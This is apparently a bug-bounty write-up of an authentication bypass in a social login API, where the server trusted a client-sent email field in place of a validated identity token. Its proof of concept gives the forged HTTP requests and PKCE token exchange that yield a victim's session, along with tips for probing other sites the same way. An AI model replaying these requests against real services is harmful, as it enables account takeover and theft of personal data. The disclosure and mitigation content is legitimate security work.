# Broken Social Login – Authentication Bypass Leading to Account Takeover

> **Date:** August 2026
> **Tags:** Authentication, PKCE, JWT

---

## Overview

A critical authentication bypass existed in the application's social login implementation. The backend API trusted client-supplied JSON parameters to establish user identity instead of cryptographically validating the third-party identity token. This allowed an unauthenticated remote attacker to completely take over any user account without requiring credentials or user interaction.

## Technical Explanation

The vulnerability breaks the trust boundary between the client, the application backend, and the Identity Provider like Google or Firebase.

When a user authenticates via social login, the frontend sends a `POST` request to `/api/v1/oauth/sociallogin`. Instead of passing an opaque `id_token` for backend validation, the request body carries explicit identity fields in plaintext JSON. These fields include `firstName`, `lastName`, `emailid`, `socialUId`, `issuer`, and `audience`.

Root Cause: The backend lacks server-side token validation. It does not verify the signature, issuer, or audience of any token. It also does not enforce proof of ownership for the supplied `emailid`.

Attack Flow:
1. An attacker intercepts the social login request and modifies the `emailid` to a victim's address. They provide an arbitrary `socialUId`.
2. The server trusts the JSON payload verbatim and successfully issues an `authorizationCode`.
3. The attacker submits this code to the `/api/v1/oauth/token` endpoint along with a PKCE `codeVerifier`.
4. The server mints a legitimate session and returns server-signed RS256 JWT cookies (`bmt`), CSRF tokens, and device tokens. The `user.eml` claim is bound to the attacker-chosen victim email.

This relies entirely on client-side assertions for authentication.

## Simple Explanation

Imagine a high-security building where the security guard is supposed to check your government-issued ID card before letting you in. 

Instead of looking at your ID card to verify its authenticity, the guard simply asks you for your name. If you reply that you are the CEO, the guard believes you without any proof and hands you the master keys to the building.

The server acted exactly like that guard. Instead of cryptographically checking the token issued by Google, it simply asked the mobile app who was logging in. An attacker could type in anyone's email address, and the server would instantly grant full access to that person's account.

## My Thought Process

Social login implementations are high-value targets because developers often struggle with correct OAuth trust models.

During initial reconnaissance, I intercepted the traffic of the social login flow. The structure of the `POST /api/v1/oauth/sociallogin` request caught my attention immediately. The client was sending raw identity fields like `"emailid": "user@gmail.com"` and `"socialUId": "12345"` directly in the JSON body. 

My initial hypothesis was that a secure implementation should only require an `id_token` or `access_token` from the provider. The backend should parse the email from that token. If the API is asking the client for the email address, it might be trusting the client's input instead of the token itself.

I tested this by generating a PKCE challenge. I fabricated a social login request using a test victim's email address and intentionally omitted any valid Google tokens. I expected the server to throw a `401 Unauthorized` or `400 Bad Request` due to missing token signatures.

To my surprise, the server responded with a `200 OK` and handed me a valid `authorizationCode`. I completed the standard PKCE token exchange flow with this code. The backend handed me a signed JWT session for the victim. The approach worked because the backend developers completely delegated identity verification to the client app.

## Exploitation / Proof of Concept

The exploitation process requires no user interaction and only requires knowledge of the target victim's email address.

### Step 1: Compute PKCE Challenge

Generate a PKCE code challenge from an arbitrary verifier.

Verifier: `TESTVERIFIER123456789012345678901234567890`
Challenge: `xg2SPH29r2e6mYbHGnOsDas3tQa1uJLF-f1FySSFp2E`

### Step 2: Fabricate Social Login Request

Send a `POST` request to `/api/v1/oauth/sociallogin` specifying the victim's email. Notice that no credentials or identity tokens are provided.

```http
POST /api/v1/oauth/sociallogin HTTP/2
Host: api.target.com
Content-Type: application/json

{
  "firstName": "big",
  "lastName": "bug",
  "emailid": "victim@example.com",
  "provider": ["email"],
  "active": true,
  "issuer": "https://securetoken.google.com/retbgbm",
  "audience": "retbgbm",
  "socialUId": "attacker-suid-random",
  "responseType": "code",
  "codeChallenge": "xg2SPH29r2e6mYbHGnOsDas3tQa1uJLF-f1FySSFp2E",
  "codeChallengeMethod": "SHA256"
}
```

Response: The server trusts the input and issues an authorization code.

```json
{
  "state": "test123",
  "authorizationCode": "2PIC1Cty5Hig/31L5Xf5dA0tB79g="
}
```

### Step 3: Exchange Code for Session

Exchange the acquired code for the actual session tokens.

```http
POST /api/v1/oauth/token HTTP/2
Host: api.target.com
Content-Type: application/json

{
  "grantType": "authorization_code",
  "authCode": "2PIC1Cty5Hig/31L5Xf5dA0tB79g=",
  "codeVerifier": "TESTVERIFIER123456789012345678901234567890"
}
```

Response: The server issues the victim's JWT cookies (`bmt`) and CSRF/Device tokens.

```http
HTTP/2 200
set-cookie: bmt=<VICTIM_JWT>; Max-Age=604800; HttpOnly; SameSite=Strict
set-cookie: bvt=<token>; HttpOnly; SameSite=Strict

{"csrftoken":"...","devicetoken":"...","tokentype":"access_token"}
```

At this point, the attacker has achieved full Account Takeover and can perform authenticated `GET /api/v1/user/details` to read PII, or `POST /api/v1/user/update` to permanently modify the victim's profile.

## Impact

The security impact is a zero-click Account Takeover affecting all users on the platform. An unauthenticated remote attacker can:

* Take over any account merely by knowing the email address.
* Read sensitive PII including full names, dates of birth, gender, mobile numbers, and physical addresses.
* Write and persistently modify victim profile data.
* Bypass account lockouts since the flawed social flow succeeds even when the target account's `accountLocked` status is `true`.
* Conduct pre-registration or doppelgänger attacks by registering unlinked emails.

## Mitigation

To remediate this vulnerability, the trust model must be shifted from the client back to the server:

1. Cryptographic Validation: The backend must independently validate the Google or Firebase identity token (`id_token`) server-side. This includes verifying the cryptographic signature via the provider's JWKS and checking the `iss`, `aud`, and `exp` claims.
2. Zero Client Trust: Never derive user identity parameters from unverified JSON payloads sent by the client. These values must be extracted exclusively from the securely validated token payload.
3. Enforce Lockouts: Ensure that global account lockout logic and rate-limiting are properly enforced across all authentication endpoints, including social login flows.

## Tips

Look for explicit identity fields when you are testing a social login or SSO flow. Intercept the request and look for parameters like `email`, `user_id`, or `uuid`. If the application sends these alongside the OAuth token, it indicates the backend might be relying on client assertions.

Try sending the login request with the victim's email but completely remove the actual OAuth token or replace it with a blank string. If the server processes it, you have an authentication bypass.

If the backend does check the token, try sending a valid token generated by your own attacker account, but change the `email` JSON parameter to the victim's email. Poorly configured backends will validate the attacker's token but use the JSON email to log the user in.

## References

* OWASP Top 10: Broken Authentication
* RFC 6819: OAuth 2.0 Threat Model and Security Considerations
